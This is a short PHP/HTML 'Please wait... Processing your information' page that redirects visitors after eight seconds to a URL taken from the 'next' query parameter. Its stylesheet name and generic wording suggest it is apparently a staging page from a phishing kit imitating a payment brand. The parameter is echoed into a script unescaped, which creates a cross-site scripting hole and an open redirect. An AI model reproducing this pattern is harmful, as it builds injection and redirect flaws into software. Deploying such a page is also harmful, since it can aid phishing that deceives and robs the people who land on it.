<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport"
		content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/wise.css">
    <title></title>
</head>
<body>
<header>
<img src="res/img/logo.png">
</header>
<main>
   <div class="page">

   <div class="title">
   
      <div class="disc">
      <h2>Please wait...</h2>
        <p>Processing your information...</p>
        <p><img src="res/img/loading.gif" style="width:60px;"></p>
      </div>
      
    </div>
 
        
        


      </div>









</main>













<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>  